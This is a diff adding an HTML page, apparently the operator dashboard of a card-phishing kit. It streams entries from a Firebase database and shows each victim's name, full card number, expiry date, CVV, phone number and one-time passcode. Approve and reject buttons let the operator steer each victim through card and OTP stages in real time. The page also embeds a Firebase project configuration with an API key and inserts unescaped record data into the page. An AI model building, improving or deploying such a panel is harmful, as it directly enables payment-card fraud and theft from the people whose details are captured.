@@ -1,0 +1,692 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ronny ·</title>
+
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Bodoni+Moda:ital,opsz,wght@0,6..96,400..900;1,6..96,400..900&display=swap');
+
+/* ============================================================
+   DESIGN TOKENS
+   ============================================================ */
+:root{
+  --bg:            #050505;
+  --bg-soft:       #0a0b10;
+  --card-top:      rgba(255,255,255,0.045);
+  --card-bottom:   rgba(255,255,255,0.015);
+  --line:          rgba(255,255,255,0.06);
+  --line-soft:     rgba(255,255,255,0.035);
+
+  --text:          #e2e8f0;
+  --text-strong:   #ffffff;
+  --muted:         #8a94a6;
+  --muted-dim:     #4b5364;
+
+  --gold:          #c9b37e;
+  --gold-soft:     rgba(201,179,126,0.12);
+  --gold-line:     rgba(201,179,126,0.22);
+
+  --emerald:       #3fbf8f;
+  --emerald-soft:  rgba(63,191,143,0.08);
+  --emerald-line:  rgba(63,191,143,0.24);
+
+  --crimson:       #e5484d;
+  --crimson-soft:  rgba(229,72,77,0.08);
+  --crimson-line:  rgba(229,72,77,0.24);
+
+  --amber:         #e0a94a;
+  --amber-soft:    rgba(224,169,74,0.08);
+  --amber-line:    rgba(224,169,74,0.24);
+
+  --ease:          cubic-bezier(0.25, 0.8, 0.25, 1);
+  --radius-lg:     22px;
+  --radius-md:     14px;
+  --radius-sm:     10px;
+}
+
+/* ============================================================
+   RESET
+   ============================================================ */
+*{
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: 'Bodoni Moda', serif;
+}
+
+html{ -webkit-text-size-adjust: 100%; }
+
+body{
+  background: var(--bg);
+  color: var(--text);
+  min-height: 100vh;
+  padding: 48px 32px 90px;
+  font-weight: 400;
+  line-height: 1.5;
+  -webkit-font-smoothing: antialiased;
+  -moz-osx-font-smoothing: grayscale;
+  overflow-x: hidden;
+}
+
+/* Ambient cinematic backdrop — fixed, zero repaint cost */
+.ambient{
+  position: fixed;
+  inset: 0;
+  z-index: -1;
+  pointer-events: none;
+  background:
+    radial-gradient(900px 520px at 88% -12%, rgba(201,179,126,0.10), transparent 62%),
+    radial-gradient(760px 520px at 6% 108%, rgba(63,191,143,0.055), transparent 62%),
+    linear-gradient(180deg, #050505 0%, #0a0b10 55%, #050505 100%);
+}
+
+/* ============================================================
+   HEADER — GLASSMORPHISM
+   ============================================================ */
+.header{
+  position: relative;
+  max-width: 1600px;
+  margin: 0 auto 42px;
+  padding: 26px 34px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  flex-wrap: wrap;
+  gap: 22px;
+  border: 1px solid var(--line);
+  border-radius: 24px;
+  background: rgba(255,255,255,0.028);
+  backdrop-filter: blur(18px) saturate(140%);
+  -webkit-backdrop-filter: blur(18px) saturate(140%);
+  box-shadow:
+    0 40px 90px -50px rgba(0,0,0,0.95),
+    inset 0 1px 0 rgba(255,255,255,0.05);
+  overflow: hidden;
+}
+
+.header::after{
+  content: '';
+  position: absolute;
+  inset: auto 0 0 0;
+  height: 1px;
+  background: linear-gradient(90deg, transparent, rgba(201,179,126,0.55), transparent);
+}
+
+.brand{
+  display: flex;
+  align-items: center;
+  gap: 18px;
+  min-width: 0;
+}
+
+.brand-mark{
+  flex: 0 0 auto;
+  width: 40px;
+  height: 40px;
+  border-radius: 12px;
+  background: linear-gradient(150deg, rgba(201,179,126,0.85), rgba(201,179,126,0.15));
+  box-shadow: 0 0 26px rgba(201,179,126,0.28), inset 0 0 0 1px rgba(255,255,255,0.12);
+  transform: rotate(45deg);
+}
+
+.header h1{
+  font-size: clamp(1.35rem, 2.3vw, 2rem);
+  font-weight: 900;
+  letter-spacing: 0.015em;
+  line-height: 1.15;
+  color: var(--text-strong);
+}
+
+.header h1 em{
+  font-style: italic;
+  font-weight: 900;
+  color: var(--gold);
+}
+
+.header p{
+  margin-top: 5px;
+  font-size: 0.86rem;
+  font-weight: 400;
+  font-style: italic;
+  letter-spacing: 0.02em;
+  color: var(--muted);
+}
+
+.live{
+  display: inline-flex;
+  align-items: center;
+  gap: 9px;
+  padding: 8px 17px;
+  border-radius: 50px;
+  border: 1px solid var(--emerald-line);
+  background: var(--emerald-soft);
+  color: #7fd9b4;
+  font-size: 0.68rem;
+  font-weight: 700;
+  letter-spacing: 0.16em;
+  text-transform: uppercase;
+  white-space: nowrap;
+}
+
+.live-dot{
+  width: 7px;
+  height: 7px;
+  border-radius: 50%;
+  background: var(--emerald);
+  box-shadow: 0 0 10px var(--emerald);
+  animation: pulse 2.2s var(--ease) infinite;
+}
+
+@keyframes pulse{
+  0%, 100% { opacity: 1;   transform: scale(1); }
+  50%      { opacity: 0.35; transform: scale(0.75); }
+}
+
+/* ============================================================
+   GRID
+   ============================================================ */
+.grid{
+  max-width: 1600px;
+  margin: 0 auto;
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(380px, 1fr));
+  gap: 30px;
+}
+
+/* ============================================================
+   TRANSACTION CARD
+   ============================================================ */
+.card{
+  position: relative;
+  padding: 28px 26px 24px;
+  border: 1px solid rgba(255,255,255,0.05);
+  border-radius: var(--radius-lg);
+  background: linear-gradient(160deg, var(--card-top), var(--card-bottom));
+  backdrop-filter: blur(10px);
+  -webkit-backdrop-filter: blur(10px);
+  box-shadow:
+    0 26px 60px -32px rgba(0,0,0,0.95),
+    inset 0 1px 0 rgba(255,255,255,0.045);
+  transition: all 0.4s var(--ease);
+  will-change: transform;
+}
+
+.card:hover{
+  transform: translateY(-5px);
+  border-color: var(--gold-line);
+  box-shadow:
+    0 38px 78px -32px rgba(0,0,0,1),
+    0 0 0 1px rgba(201,179,126,0.07),
+    inset 0 1px 0 rgba(255,255,255,0.07);
+}
+
+/* ---------- Delete button ---------- */
+.delete-btn{
+  position: absolute;
+  top: 20px;
+  right: 20px;
+  width: 34px;
+  height: 34px;
+  display: grid;
+  place-items: center;
+  border: 1px solid rgba(255,255,255,0.06);
+  border-radius: var(--radius-sm);
+  background: transparent;
+  color: var(--muted-dim);
+  cursor: pointer;
+  opacity: 0.55;
+  transition: all 0.4s var(--ease);
+}
+
+.card:hover .delete-btn{ opacity: 1; }
+
+.delete-btn:hover{
+  color: var(--crimson);
+  border-color: var(--crimson-line);
+  background: var(--crimson-soft);
+  transform: rotate(10deg);
+}
+
+.delete-btn svg{ display: block; }
+
+/* ---------- Card title ---------- */
+.card-title{
+  font-size: 1.18rem;
+  font-weight: 900;
+  letter-spacing: 0.015em;
+  line-height: 1.3;
+  color: var(--text-strong);
+  padding-bottom: 16px;
+  margin-bottom: 6px;
+  padding-right: 46px;
+  border-bottom: 1px solid var(--line);
+}
+
+/* ---------- Data rows ---------- */
+.data-list{ display: flex; flex-direction: column; }
+
+.data-row{
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 16px;
+  padding: 11px 0;
+  border-bottom: 1px solid var(--line-soft);
+  font-size: 0.88rem;
+}
+
+.data-list .data-row:last-child{ border-bottom: none; }
+
+.data-label{
+  flex: 0 0 auto;
+  font-size: 0.68rem;
+  font-weight: 700;
+  letter-spacing: 0.13em;
+  text-transform: uppercase;
+  color: var(--muted);
+}
+
+.data-val{
+  min-width: 0;
+  font-size: 0.9rem;
+  font-weight: 700;
+  letter-spacing: 0.02em;
+  color: var(--text);
+  text-align: right;
+  overflow-wrap: anywhere;
+  font-variant-numeric: tabular-nums;
+}
+
+/* ---------- Status line ---------- */
+.status-line{
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 14px;
+  margin-top: 14px;
+  padding-top: 16px;
+  border-top: 1px solid var(--line);
+}
+
+/* ---------- Status badges ---------- */
+.badge{
+  display: inline-flex;
+  align-items: center;
+  gap: 8px;
+  padding: 6px 15px;
+  border-radius: 50px;
+  border: 1px solid transparent;
+  font-size: 0.66rem;
+  font-weight: 700;
+  letter-spacing: 0.1em;
+  text-transform: uppercase;
+  white-space: nowrap;
+  transition: all 0.4s var(--ease);
+}
+
+.badge::before{
+  content: '';
+  width: 6px;
+  height: 6px;
+  border-radius: 50%;
+  background: currentColor;
+  box-shadow: 0 0 9px currentColor;
+}
+
+.badge-pending{
+  color: var(--amber);
+  background: var(--amber-soft);
+  border-color: var(--amber-line);
+  box-shadow: inset 0 0 14px rgba(224,169,74,0.09);
+}
+
+.badge-approved{
+  color: var(--emerald);
+  background: var(--emerald-soft);
+  border-color: var(--emerald-line);
+  box-shadow: inset 0 0 14px rgba(63,191,143,0.09);
+}
+
+.badge-rejected{
+  color: var(--crimson);
+  background: var(--crimson-soft);
+  border-color: var(--crimson-line);
+  box-shadow: inset 0 0 14px rgba(229,72,77,0.09);
+}
+
+.badge-idle{
+  color: var(--muted);
+  background: rgba(255,255,255,0.035);
+  border-color: rgba(255,255,255,0.07);
+}
+
+/* ============================================================
+   OTP SECTION
+   ============================================================ */
+.otp-section{
+  margin: 24px -26px 0;
+  padding: 22px 26px 4px;
+  border-top: 1px solid rgba(255,255,255,0.08);
+  background: linear-gradient(180deg, rgba(201,179,126,0.045), rgba(255,255,255,0) 70%);
+}
+
+.section-title{
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  margin-bottom: 16px;
+  font-size: 0.66rem;
+  font-weight: 900;
+  font-style: italic;
+  letter-spacing: 0.24em;
+  text-transform: uppercase;
+  color: var(--gold);
+}
+
+.section-title::after{
+  content: '';
+  flex: 1 1 auto;
+  height: 1px;
+  background: linear-gradient(90deg, rgba(201,179,126,0.4), transparent);
+}
+
+.otp-label{
+  display: block;
+  margin-bottom: 10px;
+  font-size: 0.68rem;
+  font-weight: 700;
+  letter-spacing: 0.13em;
+  text-transform: uppercase;
+  color: var(--muted);
+}
+
+.otp-display{
+  display: block;
+  margin: 4px 0 6px;
+  padding: 16px 12px;
+  border: 1px solid var(--gold-line);
+  border-radius: var(--radius-md);
+  background: rgba(0,0,0,0.38);
+  color: var(--gold);
+  font-size: 1.85rem;
+  font-weight: 900;
+  font-style: italic;
+  letter-spacing: 4px;
+  text-align: center;
+  direction: ltr;
+  font-variant-numeric: tabular-nums;
+  text-shadow: 0 0 22px rgba(201,179,126,0.35);
+}
+
+/* ============================================================
+   BUTTONS — GHOST → SOLID ON HOVER
+   ============================================================ */
+.actions{
+  display: flex;
+  gap: 12px;
+  margin-top: 18px;
+}
+
+.btn{
+  flex: 1 1 0;
+  padding: 12px 14px;
+  border-radius: 12px;
+  border: 1px solid transparent;
+  background: transparent;
+  font-family: inherit;
+  font-size: 0.78rem;
+  font-weight: 700;
+  letter-spacing: 0.09em;
+  text-transform: uppercase;
+  cursor: pointer;
+  transition: all 0.4s var(--ease);
+}
+
+.btn-acc{
+  color: var(--emerald);
+  border-color: var(--emerald-line);
+  background: var(--emerald-soft);
+}
+
+.btn-acc:hover{
+  background: var(--emerald);
+  border-color: var(--emerald);
+  color: #04120c;
+  box-shadow: 0 10px 26px -10px rgba(63,191,143,0.55);
+  transform: translateY(-1px);
+}
+
+.btn-rej{
+  color: var(--crimson);
+  border-color: var(--crimson-line);
+  background: var(--crimson-soft);
+}
+
+.btn-rej:hover{
+  background: var(--crimson);
+  border-color: var(--crimson);
+  color: #17060a;
+  box-shadow: 0 10px 26px -10px rgba(229,72,77,0.55);
+  transform: translateY(-1px);
+}
+
+.btn:active{ transform: translateY(0) scale(0.985); }
+
+/* ============================================================
+   EMPTY STATE
+   ============================================================ */
+.empty{
+  grid-column: 1 / -1;
+  padding: 100px 24px;
+  border: 1px dashed rgba(255,255,255,0.07);
+  border-radius: 24px;
+  background: rgba(255,255,255,0.012);
+  text-align: center;
+  font-size: 1.5rem;
+  font-weight: 700;
+  font-style: italic;
+  letter-spacing: 0.02em;
+  color: var(--muted-dim);
+}
+
+/* ============================================================
+   SCROLLBAR
+   ============================================================ */
+::-webkit-scrollbar{ width: 9px; }
+::-webkit-scrollbar-track{ background: #050505; }
+::-webkit-scrollbar-thumb{
+  background: rgba(201,179,126,0.18);
+  border-radius: 50px;
+}
+::-webkit-scrollbar-thumb:hover{ background: rgba(201,179,126,0.32); }
+
+/* ============================================================
+   RESPONSIVE
+   ============================================================ */
+@media (max-width: 900px){
+  body{ padding: 32px 20px 70px; }
+  .header{ padding: 22px 22px; border-radius: 20px; }
+  .brand-mark{ width: 34px; height: 34px; }
+}
+
+@media (max-width: 720px){
+  .grid{ grid-template-columns: 1fr; gap: 22px; }
+  .card{ padding: 24px 20px 20px; }
+  .otp-section{ margin: 22px -20px 0; padding: 20px 20px 4px; }
+  .otp-display{ font-size: 1.55rem; letter-spacing: 3px; }
+  .live{ display: none; }
+}
+</style>
+</head>
+<body>
+
+<div class="ambient"></div>
+
+<header class="header">
+  <div class="brand">
+    <span class="brand-mark"></span>
+    <div>
+      <h1>Ronny</h1>
+    </div>
+  </div>
+  <div class="live"><span class="live-dot"></span> Live Connected</div>
+</header>
+
+<main class="grid" id="transactions-grid">
+  <div class="empty">Connecting to server…</div>
+</main>
+
+<script>
+/* ============================================================
+   FIREBASE — initialization unchanged
+   ============================================================ */
+const firebaseConfig = {
+  apiKey: "AIzaSyDpaVwjinoz96ywXoD63eJ88F3pR2deqhY",
+  authDomain: "golden-a5c1e.firebaseapp.com",
+  projectId: "golden-a5c1e",
+  storageBucket: "golden-a5c1e.firebasestorage.app",
+  messagingSenderId: "240349720049",
+  appId: "1:240349720049:web:393f8507fe928ebc20e850"
+};
+
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+const grid = document.getElementById('transactions-grid');
+
+/* ============================================================
+   LIVE LISTENER — same node, same flow
+   ============================================================ */
+db.ref('transactions').on('value', (snapshot) => {
+  grid.innerHTML = '';
+  const data = snapshot.val();
+
+  if (!data) {
+    grid.innerHTML = '<div class="empty">No transactions yet</div>';
+    return;
+  }
+
+  // Sort newest → oldest
+  const entries = Object.entries(data).sort((a, b) => (b[1].timestamp || 0) - (a[1].timestamp || 0));
+
+  entries.forEach(([id, tx]) => {
+    const card = document.createElement('div');
+    card.className = 'card';
+
+    /* ---------- Card status ---------- */
+    let cStatusHtml = '';
+    if (tx.cardStatus === 'pending')       cStatusHtml = '<span class="badge badge-pending">Pending Review</span>';
+    else if (tx.cardStatus === 'approved') cStatusHtml = '<span class="badge badge-approved">Approved</span>';
+    else                                   cStatusHtml = '<span class="badge badge-rejected">Rejected</span>';
+
+    /* ---------- OTP status ---------- */
+    let oStatusHtml = '';
+    if (tx.otpStatus === 'pending')        oStatusHtml = '<span class="badge badge-pending">Awaiting Activation</span>';
+    else if (tx.otpStatus === 'approved')  oStatusHtml = '<span class="badge badge-approved">Activated</span>';
+    else if (tx.otpStatus === 'rejected')  oStatusHtml = '<span class="badge badge-rejected">Rejected</span>';
+    else                                   oStatusHtml = '<span class="badge badge-idle">Not Sent Yet</span>';
+
+    let html = `
+      <button class="delete-btn" onclick="deleteTx('${id}')" title="Delete transaction" aria-label="Delete transaction">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"
+             stroke-linecap="round" stroke-linejoin="round" width="15" height="15">
+          <path d="M3 6h18M8 6V4h8v2M19 6l-1 14H6L5 6M10 11v6M14 11v6"/>
+        </svg>
+      </button>
+
+      <div class="card-title">${tx.firstName || 'Unknown'} ${tx.lastName || ''}</div>
+
+      <div class="data-list">
+        <div class="data-row">
+          <span class="data-label">Cardholder Name</span>
+          <span class="data-val">${tx.cardName || '---'}</span>
+        </div>
+        <div class="data-row">
+          <span class="data-label">Card Number</span>
+          <span class="data-val" dir="ltr">${tx.cardNumber || '---'}</span>
+        </div>
+        <div class="data-row">
+          <span class="data-label">Expiry Date</span>
+          <span class="data-val" dir="ltr">${tx.expiryDate || '---'}</span>
+        </div>
+        <div class="data-row">
+          <span class="data-label">CVV</span>
+          <span class="data-val" dir="ltr">${tx.cvv || '---'}</span>
+        </div>
+      </div>
+
+      <div class="status-line">
+        <span class="data-label">Card Status</span>
+        ${cStatusHtml}
+      </div>
+    `;
+
+    /* ---------- Card action buttons ---------- */
+    if (tx.cardStatus === 'pending') {
+      html += `
+        <div class="actions">
+          <button class="btn btn-acc" onclick="updateCard('${id}', 'approved')">Approve Card</button>
+          <button class="btn btn-rej" onclick="updateCard('${id}', 'rejected')">Reject Card</button>
+        </div>
+      `;
+    }
+
+    /* ---------- OTP section (only after card approval) ---------- */
+    if (tx.cardStatus === 'approved') {
+      html += `
+        <div class="otp-section">
+          <div class="section-title">Verification Details · OTP</div>
+
+          <div class="data-row">
+            <span class="data-label">Phone Number</span>
+            <span class="data-val" dir="ltr">${tx.phone || '---'}</span>
+          </div>
+
+          <div style="margin-top:16px;">
+            <span class="otp-label">OTP Code</span>
+            <span class="otp-display" dir="ltr">${tx.otp || '---'}</span>
+          </div>
+
+          <div class="data-row">
+            <span class="data-label">Code Status</span>
+            ${oStatusHtml}
+          </div>
+
+          ${tx.otpStatus === 'pending' ? `
+            <div class="actions">
+              <button class="btn btn-acc" onclick="updateOtp('${id}', 'approved')">Confirm Code</button>
+              <button class="btn btn-rej" onclick="updateOtp('${id}', 'rejected')">Reject Code</button>
+            </div>
+          ` : ''}
+        </div>
+      `;
+    }
+
+    card.innerHTML = html;
+    grid.appendChild(card);
+  });
+});
+
+/* ============================================================
+   ACTIONS — logic unchanged
+   ============================================================ */
+window.updateCard = function(id, status) {
+  db.ref('transactions/' + id).update({ cardStatus: status });
+}
+
+window.updateOtp = function(id, status) {
+  db.ref('transactions/' + id).update({ otpStatus: status });
+}
+
+window.deleteTx = function(id) {
+  if (confirm('Are you sure you want to delete this transaction?')) {
+    db.ref('transactions/' + id).remove();
+  }
+}
+</script>
+</body>
+</html>
